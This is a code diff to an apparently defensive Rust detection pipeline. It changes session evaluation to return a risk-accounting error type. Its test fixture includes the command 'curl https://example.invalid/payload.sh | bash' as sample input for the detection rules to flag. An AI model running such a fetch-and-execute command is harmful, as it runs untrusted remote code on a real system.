@@ -25,6 +25,7 @@ pub use telltale_detect::detection::evaluate_session_matches;
 pub use telltale_rules::{CompiledRuleSet, MatchResult};
 pub use telltale_schema::event::Event;
 pub use telltale_schema::record::NormalizedRecord;
+pub use telltale_schema::scoring::{RiskAccountingError, RiskContribution, RiskContributionType};
 pub use telltale_schema::source::Source;
 
 use std::path::Path;
@@ -83,7 +84,10 @@ impl Pipeline {
 
     /// Evaluate the rule set over one session's records without building
     /// events — the raw match result an inline (proxy-style) caller needs.
-    pub fn evaluate_session(&self, records: &[NormalizedRecord]) -> Option<MatchResult> {
+    pub fn evaluate_session(
+        &self,
+        records: &[NormalizedRecord],
+    ) -> Result<Option<MatchResult>, telltale_schema::scoring::RiskAccountingError> {
         evaluate_session_matches(&self.rule_set, records)
     }
 }
@@ -203,7 +207,10 @@ mod tests {
             Some("curl https://example.invalid/payload.sh | bash"),
         )];
 
-        let result = pipeline.evaluate_session(&records).expect("match");
+        let result = pipeline
+            .evaluate_session(&records)
+            .expect("evaluate")
+            .expect("match");
         assert!(result.score > 0);
         assert!(!result.rule_ids.is_empty());
     }
